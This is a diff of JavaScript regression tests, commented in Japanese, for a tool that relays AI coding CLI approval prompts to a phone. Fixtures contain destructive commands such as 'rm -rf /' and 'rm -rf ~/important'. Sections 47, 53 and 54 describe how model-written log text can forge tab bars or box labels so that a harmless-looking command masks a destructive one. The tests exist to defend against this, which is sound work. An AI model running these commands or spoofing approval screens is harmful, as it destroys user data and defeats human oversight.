+  assertEq('長すぎる id は弾く', safeIdPath('a'.repeat(65)), null)
+  // 回答済み印を数えても質問数は変わらない
+  assertEq('回答済みが混じっても質問数は不変', expectedTabCount('☒ a ☐ b ☐ c ✔ Submit →'), 3)
+
+  // PC 側で操作が始まっているかは、CLI が描く印で分かる。巡回はここで止める
+  // (止めないと Shift+Tab でユーザーのフォーカスを奪い返す)。
+  // 実機で観測したタブバー行そのものを fixture にする(2026-07-29、cols=280)。
+  const liveBar =
+    '←  ☒ 巡回順序  ☐ 検証環境  ☐ 確認項目  ☐ 完了後  ✔ Submit  →                    '
+  assertEq('実機の回答済みバーを検出する', anyTabAnswered(liveBar), true)
+  assertEq('未回答なら偽', anyTabAnswered('← ☐ a ☐ b ☐ c ✔ Submit →'), false)
+  assertEq('⊠ も回答済み', anyTabAnswered('← ⊠ a ☐ b ✔ Submit →'), true)
+  assertEq('✓ も回答済み', anyTabAnswered('← ✓ a □ b ✓ Submit →'), true)
+  assertEq('Submit の印だけでは回答済みにしない', anyTabAnswered('← ☐ a ☐ b ✔ Submit →'), false)
+  assertEq('タブバーが無ければ偽', anyTabAnswered('Esc to cancel'), false)
+  // 実バーから質問数と指紋も正しく読めること(fixture の妥当性確認)
+  assertEq('実機バーの質問数', expectedTabCount(liveBar), 4)
+  assertEq(
+    '実機バーの指紋',
+    tabBarSignature(liveBar),
+    'ml5:☒☐☐☐✔:4:巡回順序|4:検証環境|4:確認項目|3:完了後'
+  )
+}
+
+// -------------------------------------------------------
+// 43. v1.18.1: rewind 上限 / タブの相互識別可能性
+// -------------------------------------------------------
+console.log('\n[43] rewindStepsCap / tabsMutuallyDistinct')
+{
+  assertEq('expected=4 → 6', rewindStepsCap(4), 6)
+  assertEq('expected=1 → 3', rewindStepsCap(1), 3)
+  assertEq('expected=null → 既定 5', rewindStepsCap(null), 5)
+  assertEq('expected=0 → 既定 5', rewindStepsCap(0), 5)
+  assertEq('上限は hard cap', rewindStepsCap(50), REWIND_STEPS_HARD_CAP)
+
+  const t = (prompt, n) => ({ prompt, options: Array.from({ length: n }, (_, i) => `o${i}`) })
+  assertEq('全部違えば true', tabsMutuallyDistinct([t('赤は?', 2), t('青は?', 3)]), true)
+  assertEq(
+    '同一内容タブがあれば false(位置をテキストで証明できない)',
+    tabsMutuallyDistinct([t('好きな色は?', 2), t('好きな色は?', 2)]),
+    false
+  )
+  assertEq('空配列 → false', tabsMutuallyDistinct([]), false)
+  assertEq('非配列 → false', tabsMutuallyDistinct(null), false)
+}
+
+// -------------------------------------------------------
+// 44. v1.18.1: 巡回 latch(1 回の出現につき 1 回だけ)
+// -------------------------------------------------------
+console.log('\n[44] nextEpoch: 巡回を 1 出現 1 回に閉じる')
+{
+  const handled = { handled: true, absent: 0 }
+  // 出現が続く間は handled のまま = 再巡回しない(これが「ぐるぐる回る」の直接の止め)
+  let s = nextEpoch(handled, { tabbedNow: true })
+  assertEq('出現中は handled 維持', s.handled, true)
+  s = nextEpoch(s, { tabbedNow: true })
+  assertEq('何度 tick しても handled 維持', s.handled, true)
+
+  // 1 回だけの不在(再描画の谷)では解除しない
+  s = nextEpoch(handled, { tabbedNow: false })
+  assertEq('1 回の不在では解除しない', s.handled, true)
+  assertEq('不在カウントは進む', s.absent, 1)
+  s = nextEpoch(s, { tabbedNow: true })
+  assertEq('見えたら不在カウントはリセット', s.absent, 0)
+
+  // 連続 EPOCH_ABSENT_TICKS 回の不在で解除
+  let t = handled
+  for (let i = 0; i < EPOCH_ABSENT_TICKS; i++) t = nextEpoch(t, { tabbedNow: false })
+  assertEq('連続不在で解除', t.handled, false)
+
+  // 空白フレーム無しで別ダイアログへ遷移しても解除される(取りこぼし防止)
+  assertEq('identity が切れたら解除', nextEpoch(handled, { tabbedNow: true, identityBroken: true }).handled, false)
+  assertEq('ライフサイクル終了で解除', nextEpoch(handled, { tabbedNow: true, dialogEnded: true }).handled, false)
+  assertEq('初期状態は未処理', nextEpoch(undefined, { tabbedNow: true }).handled, false)
+}
+
+// -------------------------------------------------------
+// 45. v1.18.1: 巡回中 / 整定窓中の stdin の扱い
+// -------------------------------------------------------
+console.log('\n[45] classifyStdinDuringSweep: 確定キーは捨て、中断キーは通す')
+{
+  // 確定系は破棄(wrapper が既に送った Tab は取り消せず、Enter が移動先タブで確定するため)
+  assertEq('Enter は破棄', classifyStdinDuringSweep('\r'), { forward: '', dropped: 1 })
+  assertEq('数字は破棄', classifyStdinDuringSweep('2'), { forward: '', dropped: 1 })
+  assertEq('Tab は破棄', classifyStdinDuringSweep('\t'), { forward: '', dropped: 1 })
+  // 中断系は単独のときだけ素通し
+  assertEq('単独 Ctrl-C は通す', classifyStdinDuringSweep('\x03'), { forward: '\x03', dropped: 0 })
+  assertEq('単独 Esc は通す', classifyStdinDuringSweep('\x1b'), { forward: '\x1b', dropped: 0 })
+  // 混在 chunk: Esc を含むというだけで全部通すと \r まで通って誤確定する
+  assertEq('Esc+Enter の混在は Enter を通さない', classifyStdinDuringSweep('\x1b\r'), {
+    forward: '',
+    dropped: 2,
+  })
+  // 矢印キー(\x1b[A)から Esc だけ抜き出すとダイアログ全体がキャンセルされるので抜かない
+  assertEq('矢印キーから Esc を抜き出さない', classifyStdinDuringSweep('\x1b[A'), {
+    forward: '',
+    dropped: 3,
+  })
+  // Ctrl-C は混在でも必ず届ける(緊急停止を殺さない)
+  assertEq('混在でも Ctrl-C は届く', classifyStdinDuringSweep('ab\x03cd'), {
+    forward: '\x03',
+    dropped: 4,
+  })
+  // 貼り付け / キーリピートも 1 単位で判定(部分破棄しない)
+  assertEq('複数バイトの貼り付けは全破棄', classifyStdinDuringSweep('hello'), {
+    forward: '',
+    dropped: 5,
+  })
+}
+
+// -------------------------------------------------------
+// 46. v1.18.1: 選択中タブ index をセル属性から読む
+// -------------------------------------------------------
+console.log('\n[46] activeTabIndexFromRow: 反転属性から選択タブを特定')
+{
+  // row = { cells: [{ch, hl}] }。印の位置がタブの区切り。
+  const row = (spec) =>
+    ({ cells: [...spec].map((c, i) => ({ ch: c === '#' ? '☐' : c, hl: false, i })) })
+  const withHl = (r, from, to) => {
+    for (let i = from; i <= to; i++) r.cells[i].hl = true
+    return r
+  }
+  // "#a #b #c" → 印は index 0 / 3 / 6
+  assertEq('先頭タブが反転 → 0', activeTabIndexFromRow(withHl(row('#a #b #c'), 0, 1)), 0)
+  assertEq('2 番目のタブが反転 → 1', activeTabIndexFromRow(withHl(row('#a #b #c'), 3, 4)), 1)
+  assertEq('3 番目のタブが反転 → 2', activeTabIndexFromRow(withHl(row('#a #b #c'), 6, 7)), 2)
+  // 曖昧なものは必ず null(呼び出し側は相互識別ゲートへ倒す = 誤判定で注入しない)
+  assertEq('反転が無い → null', activeTabIndexFromRow(row('#a #b #c')), null)
+  const split = row('#a #b #c')
+  split.cells[0].hl = true
+  split.cells[6].hl = true
+  assertEq('反転が飛び飛び → null', activeTabIndexFromRow(split), null)
+  const beforeFirst = { cells: [{ ch: '←', hl: true }, { ch: '☐', hl: false }, { ch: '☐', hl: false }] }
+  assertEq('印より前で反転が始まる → null', activeTabIndexFromRow(beforeFirst), null)
+  assertEq('row が無い → null', activeTabIndexFromRow(null), null)
+
+  // 強調の起点が印そのものとは限らない。空白だけを辿って隣接する印に届くなら、その印の
+  // タブを指す。単純に「起点以前の印を数える」実装だと 1 つ手前のタブを指して誤注入になる。
+  assertEq('印の直前の余白から反転 → その印のタブ', activeTabIndexFromRow(withHl(row('#a #b #c'), 2, 4)), 1)
+  const lead = { cells: [' ', '☐', 'a', ' ', '☐', 'b'].map((c) => ({ ch: c, hl: false })) }
+  lead.cells[0].hl = true
+  lead.cells[1].hl = true
+  assertEq('先頭の余白から反転 → 0(数え上げが負にならない)', activeTabIndexFromRow(lead), 0)
+  const gap = { cells: ['☐', ' ', '☐'].map((c) => ({ ch: c, hl: false })) }
+  gap.cells[1].hl = true
+  assertEq('前後どちらの印にも届く余白 → null(曖昧)', activeTabIndexFromRow(gap), null)
+
+  // 行全体 / 複数タブに反転がかかった描画では、どのタブが選択中かを決められない。
+  // 起点だけを見て 0 を返すと、誤った index を信じたまま別タブへ注入しうる。
+  assertEq('反転が印を 2 個またぐ → null', activeTabIndexFromRow(withHl(row('#a #b #c'), 0, 4)), null)
+  assertEq('行全体が反転 → null', activeTabIndexFromRow(withHl(row('#a #b #c'), 0, 7)), null)
+  // 1 個だけをまたぐ範囲は従来どおり読める(過剰に null へ倒さない)
+  assertEq('1 個の印だけを含む反転は読める', activeTabIndexFromRow(withHl(row('#a #b #c'), 3, 5)), 1)
+}
+
+// -------------------------------------------------------
+// 46b. v1.18.1: 選択肢行 RegExp が CURSOR_CHARS から drift しないこと
+// -------------------------------------------------------
+console.log('\n[46b] OPTION_LINE_RE 相当: カーソル文字集合との整合')
+{
+  // `›` を CURSOR_CHARS に持つ CLI で `› 1. …` が選択肢行と認識されないと、
+  // その行がタブバー候補に残り、窓の中に偽の候補を作れてしまう。
+  const bar = '← ☐ a ☐ b ✔ Submit →'
+  const withCursor = (c) =>
+    `${bar}\n どれ?\n ${c} 1. A\n   2. ☐ x ☐ y ✔ Submit →\nEsc to cancel`
+  for (const c of CURSOR_CHARS) {
+    assertEq(`カーソル ${c} の選択肢行は候補にしない`, findTabBarLine(withCursor(c)), bar)
+  }
+  assertEq('ASCII > も選択肢行として扱う', findTabBarLine(withCursor('>')), bar)
+}
+
+// -------------------------------------------------------
+// 47. v1.18.1: タブバー行の走査窓(下端フッタアンカー)と一意性
+// -------------------------------------------------------
+console.log('\n[47] tabBarScan: フッタを下端アンカーにした窓 + 候補 1 本のときだけ確定')
+{
+  const bar = '← ☐ 通知方式 ☐ 対象端末 ☐ 期限 ✔ Submit →'
+  const body = ' どれにしますか?\n ❯ 1. A\n   2. B\nEsc to cancel'
+  const scan = (t) => tabBarScan(String(t).split('\n'))
+
+  assertEq('正常な画面ではバーを拾う', findTabBarLine(`● Task\n${bar}\n${body}`), bar)
+  assertEq('正常な画面は tabbed', scan(`● Task\n${bar}\n${body}`).state, 'tabbed')
+
+  // 窓は「最初の選択肢行の直上」ではなくフッタから上へ取る。会話ログに番号付き箇条書きが
+  // あるだけで実バーを見失う(= タブ式が黙って転送されない)経路を閉じる。
+  const benign = `● 手順:\n  1. まず準備\n  2. 次に実行\n${bar}\n${body}`
+  assertEq('会話ログの番号行は窓を動かさない', findTabBarLine(benign), bar)
+
+  // 実バーより上に「偽バー + 偽の番号行」を置く攻撃。旧実装では窓が実バーより上へ動き、
+  // 偽バーが採用されて指紋が PC 側の進行を反映しなくなった。候補 2 本 = fail-close。
+  const poc = `● Task\n偽: ← ☒ x ☐ y ✔ Submit →\n  1. ダミー\n${bar}\n${body}`
+  assertEq('偽バーを上に置かれたら確定しない', findTabBarLine(poc), null)
+  assertEq('偽バーがあれば ambiguous', scan(poc).state, 'ambiguous')
+  assertEq('理由は候補複数', scan(poc).reason, 'multiple-candidates')
+
+  // 選択肢行に紛れ込ませるケース(選択肢行は候補から除外される)
+  assertEq(
+    '選択肢行の偽バーは候補にしない',
+    findTabBarLine(`${bar}\n どれ?\n ❯ 1. A\n   2. ☐ x ☐ y ✔ Submit →`),
+    bar
+  )
+
+  // 候補の数え上げは選択肢ブロックより上を **全域** で行う。上端を切って
+  // 「実バーの近くだけ」を見ると、prompt の行数(モデル生成)を伸ばして実バーを
+  // 窓の外へ押し出し、内側に偽バーを 1 本置くだけでなりすませる。
+  const tall = `● Task\n${bar}\n 質問?\n${Array.from({ length: 18 }, (_, i) => `   説明の続き ${i}`).join('\n')}\n  ☐ x ☐ y ✔ Submit →\n ❯ 1. A\n   2. B\nEsc to cancel`
+  assertEq('prompt を伸ばして実バーを押し出す攻撃は確定しない', findTabBarLine(tall), null)
+  assertEq('実バーが残る限り候補は 2 本 = ambiguous', scan(tall).reason, 'multiple-candidates')
+  // 距離そのものは採否の基準にしない(離れていても候補が 1 本なら確定できる)
+  const far = `${bar}${'\n'.repeat(22)}${body}`
+  assertEq('距離が離れていても一意なら採用する', findTabBarLine(far), bar)
+  // 選択肢ブロックを読めない画面ではフッタまで下端を下げる。下げても候補が増える方向に
+  // しか動かない(= 曖昧になるだけ)ので安全性は変わらず、転送が全停止するのを避けられる。
+  const noOpt = scan(`${bar}\n 質問だけがある\nEsc to cancel`)
+  assertEq('選択肢ブロックが無くても確定できる', noOpt.state, 'tabbed')
+  assertEq('フォールバックしたことは理由に残す', noOpt.reason, 'sole-candidate/no-option-block')
+  assertEq(
+    '選択肢ブロックが無い画面でも偽バーがあれば ambiguous',
+    scan(`偽: ☐ x ☐ y ✔ Submit →\n${bar}\n 質問だけがある\nEsc to cancel`).state,
+    'ambiguous'
+  )
+
+  // 実フッタが未描画で、本文中の偽フッタが「最終出現」に化けたケース。
+  // フッタの下に中身が積み上がっていたら画面を信用しない。
+  const fakeFooter = `${bar}\n 質問?\n ❯ 1. A\nEsc to cancel\n${'x\n'.repeat(12)}`
+  assertEq('フッタが下端から離れていれば ambiguous', scan(fakeFooter).state, 'ambiguous')
+  assertEq('理由はフッタ位置', scan(fakeFooter).reason, 'footer-not-at-bottom')
+  // フッタ下の空行は数えない(端末の余白でダイアログが死なないこと)
+  const padded = `${bar}\n${body}${'\n'.repeat(12)}`
+  assertEq('フッタ下の空行は無視する', findTabBarLine(padded), bar)
+}
+
+// -------------------------------------------------------
+// 48. v1.18.1: 述語の非対称(粗い isTabbedDialog / 厳密 tabbedScreenState)
+// -------------------------------------------------------
+console.log('\n[48] isTabbedDialog / tabbedScreenState: 粗い述語と厳密判定の役割分担')
+{
+  const bar = '← ☐ 通知方式 ☐ 対象端末 ☐ 期限 ✔ Submit →'
+  const tabbed = `● Task\n${bar}\n どれ?\n ❯ 1. A\n   2. B\nEsc to cancel · Tab/Arrow keys to navigate`
+
+  // チェックリスト(☒/☐)+ → だけの画面をタブ式と誤認しない。誤認すると通常の承認が
+  // 「タブ式だから単一登録しない」に倒れ、スマホへ一切転送されなくなる。
+  const todo = [
+    '● TodoWrite',
+    '  ☒ 済んだやつ',
+    '  ☐ これから → 次',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    'Esc to cancel',
+  ].join('\n')
+  assertEq('チェックリスト画面はタブ式でない', isTabbedDialog(todo), false)
+  assertEq('チェックリスト画面は none', tabbedScreenState(todo), 'none')
+  assertEq('本物のタブ式は粗い述語でも真', isTabbedDialog(tabbed), true)
+  assertEq('本物のタブ式は tabbed', tabbedScreenState(tabbed), 'tabbed')
+
+  // フッタのタブ移動ヒントは CLI が描く = バーが折り返しても画面外へ出ても残る。
+  const barOffScreen = ' 質問?\n ❯ 1. A\n   2. B\nEsc to cancel · Tab/Arrow keys to navigate'
+  assertEq('フッタのヒントだけでも粗い述語は真', isTabbedDialog(barOffScreen), true)
+  assertEq('ただし実バーが無いので巡回はしない', tabbedScreenState(barOffScreen), 'none')
+  assertEq('単一承認のフッタにはヒントが無い', hasTabNavFooter(todo), false)
+
+  // 本文にヒント文言を書かれた場合。粗い述語は保険として真に倒す(= 単一登録しない)が、
+  // **キーを送る判断はフッタでしか許さない**。CLI が描く位置に無いヒントは根拠にしない。
+  const hintInBody = [
+    '● Task',
+    '← ☐ a ☐ b ✔ Submit →',
+    ' 本文に Tab/Arrow keys to navigate と書いてある',
+    ' ❯ 1. A',
+    '   2. B',
+    'Esc to cancel',
+  ].join('\n')
+  assertEq('本文のヒントでも粗い述語は真', isTabbedDialog(hintInBody), true)
+  assertEq('本文のヒントでは巡回しない', tabbedScreenState(hintInBody), 'none')
+
+  // 包含関係(strict ⇒ coarse)を構成で保証していることの固定。
+  // `☐ a ☐ b ✔ Submit`(ナビ表示なし)はバー候補としては成立するが粗い述語は偽。
+  // 前段の AND を外すと包含関係が破れる = この標本で検出できる。
+  const samples = [tabbed, todo, barOffScreen, bar, '☐ a ☐ b ✔ Submit', '', 'Esc to cancel']
+  const violations = samples.filter(
+    (s) => tabbedScreenState(s) !== 'none' && !isTabbedDialog(s)
+  )
+  assertEq('tabbed/ambiguous ならば粗い述語も真', violations.length, 0)
+
+  // Shift+Tab は ExitPlanMode では承認確定。送るか否かの判断は「最終出現」ではなく
+  // 「画面のどこかに出ていれば送らない」に倒す(最終出現方式は、本文に別の終端
+  // マーカーを 1 行描かれるだけで判定が裏返る)。
+  assertEq(
+    'ExitPlanMode のフッタを見分ける',
+    isExitPlanScreen(' プランでいい?\n ❯ 1. Yes\n Press shift+tab to approve'),
+    true
+  )
+  assertEq('通常フッタは ExitPlanMode でない', isExitPlanScreen(tabbed), false)
+  assertEq(
+    'フッタの後ろに別マーカーを描かれても裏返らない',
+    isExitPlanScreen(' プランでいい?\n Press shift+tab to approve\n 例: Esc to cancel'),
+    true
+  )
+  assertEq(
+    '本文に紛れていても保守側に倒す(誤検知の被害は転送しないだけ)',
+    isExitPlanScreen(' 例: shift+tab to approve と書く\n ❯ 1. A\nEsc to cancel'),
+    true
+  )
+
+  // 方針判断(この出現を処理対象から外すか)は **フッタ行** で決める。
+  // 「どこかにあれば真」を方針にも使うと、会話ログに文言が 1 行あるだけで
+  // その複合質問が永久に転送されなくなる(可用性に振り切れて復帰しない)。
+  assertEq(
+    'フッタが ExitPlanMode ならフッタ判定も真',
+    isExitPlanFooter(' プラン?\n ❯ 1. Yes\nPress shift+tab to approve'),
+    true
+  )
+  assertEq(
+    '会話ログに紛れただけならフッタ判定は偽',
+    isExitPlanFooter('● 説明: shift+tab to approve と押す\n ❯ 1. A\nEsc to cancel · Tab/Arrow keys to navigate'),
+    false
+  )
+}
+
+// -------------------------------------------------------
+// 49. v1.18.1: codex コマンド承認の折返し連結(表示欠けの防止)
+// -------------------------------------------------------
+console.log('\n[49] extractCodexCommand: 折返したコマンドを構造境界まで連結')
+{
+  // 打ち切りは戻り値の状態(`truncated`)で持つ。表示文字 `…` は本文にも現れるので
+  // 値の中の文字で判定しない(判定すると `…` で終わる説明行を持つ正常な箱が落ちる)。
+  const call = (seg) => extractCodexCommand(seg, seg.indexOf('?')).text
+
+  // 1 行目だけを採ると危険な後半が承認画面から消える(実測 cols=80)。
+  assertEq(
+    '折返しの 2 行目を落とさない',
+    call('Would you like to run?\n  $ echo "build finished" &&\n  rm -rf ~/important\n  1. Yes'),
+    'echo "build finished" && rm -rf ~/important'
+  )
+  assertEq(
+    '3 行に割れても連結する',
+    call('run?\n  $ a &&\n  b &&\n  c\n  1. Yes'),
+    'a && b && c'
+  )
+  // 空行はブロックの自然な終わり。その先に中身が無ければ印を付けない。
+  assertEq('空行で止める(先に中身なし)', call('run?\n  $ ls -la\n\n  1. Yes'), 'ls -la')
+  // 空行の先にまだ中身があるなら、表示していない本文が残るということなので印を付ける
+  assertEq('空行の先に中身があれば … を付ける', call('run?\n  $ ls -la\n\n  他の説明\n  1. Yes'), 'ls -la…')
+  // 実 UI の選択肢ブロックは必ず 1 から始まる = 自然な終端(印なし)
+  assertEq('選択肢ブロックの手前で止める', call('run?\n  $ ls -la\n  1. Yes\n  2. No'), 'ls -la')
+  // 1 で始まらない行で切れた = コマンドの続きが選択肢に見えているだけ → 打ち切り扱い
+  assertEq(
+    '1 で始まらない行で切れたら … を付ける',
+    call('run?\n  $ echo "AAAA\n  2) ; rm -rf ~/important\n  1. Yes'),
+    'echo "AAAA…'
+  )
+  // `10.` / `0.` は選択肢ブロックの開始ではない(実 UI の選択肢は 1〜9)。
+  // コマンドの続きとして **全文を表示する** = 危険な末尾を隠さない。
+  assertEq(
+    '2 桁始まりの継続行は本文として全部見せる',
+    call('run?\n  $ echo "build ok"\n  10. rm -rf ~/important\n  1. Yes'),
+    'echo "build ok" 10. rm -rf ~/important'
+  )
+  assertEq(
+    '0 始まりの継続行も全部見せる',
+    call('run?\n  $ npm run build\n  0. rm -rf ~/important\n  1. Yes'),
+    'npm run build 0. rm -rf ~/important'
+  )
+  // コマンドの続きとは考えにくい境界で止めたときは、**切ったことを必ず見せる**。
+  // 印を付けずに切ると、危険な末尾が承認画面から黙って消える(このバグ自体の再発)。
+  assertEq('次の $ 行で止めたら … を付ける', call('run?\n  $ ls -la\n  $ rm -rf /\n  1. Yes'), 'ls -la…')
+  assertEq('● 行で止めたら … を付ける', call('run?\n  $ ls -la\n  ● Bash(x)\n  1. Yes'), 'ls -la…')
+  // 単一行は従来どおり(回帰)
+  assertEq('1 行のコマンドは不変', call('run?\n  $ npm test\n  1. Yes'), 'npm test')
+  assertEq('$ 行が無ければ空', call('run?\n  1. Yes'), '')
+  // 行数上限での打ち切りも可視にする(cols=80 では文字数上限より先にこちらが効く)
+  const many = 'run?\n  $ a1\n  a2\n  a3\n  a4\n  a5\n  a6 && rm -rf ~/important\n  1. Yes'
+  assertEq('行数上限で打ち切ったら … を付ける', call(many), 'a1 a2 a3 a4 a5…')
+  assertEq('行数上限の打ち切りも可視', call(many).endsWith('…'), true)
+  // 上限を超えたら … を付けて止める(表示の暴走防止)
+  const long = 'run?\n  $ ' + 'a'.repeat(400) + '\n  ' + 'b'.repeat(400) + '\n  1. Yes'
+  assertEq('文字数上限で打ち切り、省略を示す', call(long).length, 501)
+  assertEq('打ち切りは … で示す', call(long).endsWith('…'), true)
+}
+
+// -------------------------------------------------------
+// 50. 打ち切ったコマンドは承認可能化しない(#Z 秘匿側 fail-close)
+//     打ち切りの印(…)と表示のための省略が区別できないと、スマホ側では「表示が切れて
+//     いるだけ」と「本文の後半が隠れている」を見分けられず、見えている範囲が無害な
+//     コマンドの後半(例: && rm -rf ~/important)を承認できてしまう。転送しないことで
+//     印の意味を一意にする(PC 側には CLI が全文を描いているので人はそちらで答えられる)。
+// -------------------------------------------------------
+console.log('\n[50] 打ち切ったコマンドは承認可能化しない')
+{
+  const mk = (cmdLines) =>
+    [
+      '  Would you like to run the following command?',
+      ...cmdLines,
+      '› 1. Yes, proceed (y)',
+      '  2. Yes, and don\'t ask again for commands that start with `x` (p)',
+      '  3. No, and tell Codex what to do differently (esc)',
+      '  Press enter to confirm or esc to cancel',
+    ].join('\n')
+  // 前提固定: 下の null が「codex 経路に入っていないから」ではないことを示す
+  const ok = parseDialog(mk(['  $ touch hello.txt']), { codex: true })
+  assertEq('打ち切りが無ければ検出する', !!ok, true)
+  assertEq('コマンド本文を args に持つ', ok && ok.args, 'touch hello.txt')
+  const cut = parseDialog(mk(['  $ ls -la', '  $ rm -rf /']), { codex: true })
+  assertEq('次の $ 行で打ち切られたら検出しない', cut, null)
+  const many = parseDialog(
+    mk(['  $ a1', '  a2', '  a3', '  a4', '  a5', '  a6 && rm -rf ~/important']),
+    { codex: true }
+  )
+  assertEq('行数上限の打ち切りでも検出しない', many, null)
+}
+
+// -------------------------------------------------------
+// 51. buildDescription: スマホに出す 1 行をサーバー側 cap の内側で組み立てる
+//     超過分をサーバーに切らせると、省略の印が「打ち切り」と区別できなくなる。
+//     削る順は prompt(定型文)→ args で、args を削ったときだけ明示する。
+// -------------------------------------------------------
+console.log('\n[51] buildDescription(スマホ表示 1 行の組み立て)')
+{
+  const P = 'proj'
+  assertEq(
+    '短いものはそのまま',
+    buildDescription(P, 'Bash', 'npm test', 'Do you want to proceed?'),
+    '[proj][Bash] npm test — Do you want to proceed?'
+  )
+  assertEq(
+    'args 無しは間延びさせない',
+    buildDescription(P, 'ExitPlanMode', '', 'Ready to code?'),
+    '[proj][ExitPlanMode] Ready to code?'
+  )
+  const r1 = buildDescription(P, 'Bash', 'npm test', 'p'.repeat(600))
+  assertEq('長い prompt でも枠に収まる', r1.length <= 500, true)
+  assertEq('prompt を削ってもコマンド本文は残す', r1.includes('npm test'), true)
+  const r2 = buildDescription(P, 'Bash', 'a'.repeat(480), 'Do you want to proceed?')
+  assertEq('長い args でも枠に収まる', r2.length <= 500, true)
+  assertEq('args を削ったときは明示する', r2.includes('[長すぎるため表示省略]'), true)
+  const r3 = buildDescription(P, 'Bash', 'x'.repeat(300), 'y'.repeat(300))
+  assertEq('prompt を先に削る(コマンド本文は無傷)', r3.includes('x'.repeat(300)), true)
+  assertEq('prompt 先削りでも枠に収まる', r3.length <= 500, true)
+}
+
+// -------------------------------------------------------
+// 52. sameDialogIdentity: 形が同じでも中身が違えば「同じダイアログの描き直し」にしない
+//     再描画 dedup は prompt と選択肢の形しか見ないため、15 秒以内に形の同じ Bash 承認が
+//     2 回出ると、スマホには 1 個目が出たまま承認が画面上の 2 個目に入る(#Z)。
+//     部分描画で未確定のフレームは従来どおり許容する(遅れて揃う経路を壊さない)。
+// -------------------------------------------------------
+console.log('\n[52] sameDialogIdentity(再描画 dedup の同一性)')
+{
+  const mk = (tool, args) => ({ tool, args, prompt: 'Do you want to proceed?', options: ['Yes', 'No'] })
+  assertEq('同じコマンドは同一', sameDialogIdentity(mk('Bash', 'ls'), mk('Bash', 'ls')), true)
+  assertEq(
+    '別のコマンドは同一でない(#Z の中核)',
+    sameDialogIdentity(mk('Bash', 'ls'), mk('Bash', 'rm -rf ~/important')),
+    false
+  )
+  assertEq('別の tool も同一でない', sameDialogIdentity(mk('Bash', 'ls'), mk('Edit', 'ls')), false)
+  // 部分描画: 片方が未確定(空 / Unknown)なら従来どおり再描画として許容する
+  assertEq('args 未確定は許容', sameDialogIdentity(mk('Bash', ''), mk('Bash', 'ls')), true)
+  assertEq('tool 未確定は許容', sameDialogIdentity(mk('Unknown', ''), mk('Bash', 'ls')), true)
+}
+
+// -------------------------------------------------------
+// 53. isReviewScreenText: 文言はタブバー行の直下に限る
+//     画面のどこかにあれば真にすると、モデルが会話ログへ 2 語書くだけで
+//     「Submit に着いた証拠」を作れてしまう(完全性ゲートの柱が収集数だけに戻る)。
+// -------------------------------------------------------
+console.log('\n[53] isReviewScreenText(確認画面の同定は位置つき)')
+{
+  const BAR = '← ☐ T1 ☐ T2 ✔ Submit →'
+  const real = ['● Task(plan)', BAR, 'Review your answers', 'Ready to submit your answers?', '  1. Submit answers'].join('\n')
+  assertEq('バー行の直下にあれば確認画面', isReviewScreenText(real), true)
+  // 会話ログ(バー行より上)に同じ文言があるだけでは真にしない
+  const above = ['Review your answers と Submit answers について説明します', BAR, '  質問1は?'].join('\n')
+  assertEq('バー行より上の文言は証拠にしない', isReviewScreenText(above), false)
+  // 遠く離れた位置も証拠にしない(窓の外)
+  const far = ['● Task(plan)', BAR, ...Array.from({ length: 12 }, (_, i) => `  行${i}`), 'Review your answers', '  1. Submit answers'].join('\n')
+  assertEq('窓の外の文言は証拠にしない', isReviewScreenText(far), false)
+  assertEq('バー行が無ければ偽', isReviewScreenText('Review your answers\n  1. Submit answers'), false)
+}
+
+// -------------------------------------------------------
+// 54. boxBodyLines: ラベル未描画フレームでも箱の外へ遡らない。
+//     直近の罫線の下に本文があるなら、その罫線は箱の上端 = 遡ってはいけない。
+//     遡ると、会話ログに 偽罫線 / 偽ラベル / 無害なコマンドを 3 行書くだけで
+//     スマホ表示の先頭を攻撃者の文字列にできた(args が
+//     "ls -la rm -rf /home/koishi/important" になるのを実行で再現)。
+//     下端区切り(╌╌╌╌ が prompt 直上)の形は従来どおり遡ってよい = 過剰阻止も見る。
+// -------------------------------------------------------
+console.log('\n[54] boxBodyLines: ラベル未描画フレームで箱の外へ遡らない')
+{
+  const attack = [
+    '● 作業を続けます。',
+    '────────────────',
+    ' Bash command',
+    ' ls -la',
+    '',
+    '────────────────',
+    ' rm -rf /home/koishi/important',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  assertEq('偽ラベルへ遡らず承認可能化しない', parseDialog(attack), null)
+
+  const withSeparator = [
+    '● 作業を続けます。',
+    '────────────────',
+    ' Bash command',
+    ' ls -la',
+    '',
+    '────────────────',
+    ' Bash command',
+    ' rm -rf /home/koishi/important',
+    '╌╌╌╌',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  // 下端に区切り線を持つ形(実機の録画には無い)は **遡らない** = 転送しない。
+  // 遡りは「実際の枠がラベルを描く前のフレームで会話ログの偽ラベルまで届く」経路だったので、
+  // 互換のために残さない。PC 側では従来どおり答えられる。
+  assertEq('下端区切りの形は遡らず転送しない', parseDialog(withSeparator), null)
+
+  // 実機の形(罫線 → ラベル → 本文 → prompt)は当然そのまま読める。
+  const real = [
+    '────────────────',
+    ' Bash command',
+    '',
+    '   rm -rf /home/koishi/important',
+    '   Remove the important directory',
+    '',
+    ' Do you want to proceed?',
+    ' ❯ 1. Yes',
+    '   2. No',
+    ' Esc to cancel',
+  ].join('\n')
+  const r = parseDialog(real)
+  assertEq('実機の形は読める', r && r.tool, 'Bash')
+  assertEq('コマンドと説明を連結して出す', r && r.args, 'rm -rf /home/koishi/important Remove the important directory')
+}
+
+// -------------------------------------------------------
+// 55. 承認枠から読んだ本文の打ち切り / ラベルの折り返し / 空行越しの ●Tool 行。
+//     いずれも「スマホの表示と実際に承認される内容がずれる」経路。
+// -------------------------------------------------------
+console.log('\n[55] 箱経路: 打ち切り / ラベル折り返し / 空行越しの継承')
+{
+  const box = (lines) =>
+    ['────────────────', ...lines, ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No', ' Esc to cancel'].join('\n')
+
+  // 500 字を超える本文は **無印で切ると同一性まで壊れる**(先頭 500 字が同じ別コマンドが
+  // 「同じダイアログ」になり、表示は `&& ls` のまま `&& rm -rf ~` を承認できた)。
+  const head = 'echo ' + 'a'.repeat(520)
+  assertEq('打ち切った箱の本文は承認可能化しない', parseDialog(box([' Bash command', ` ${head} && ls`])), null)
+  assertEq(
+    '同じ先頭を持つ別コマンドも同様',
+    parseDialog(box([' Bash command', ` ${head} && rm -rf ~/important`])),
+    null
+  )
+
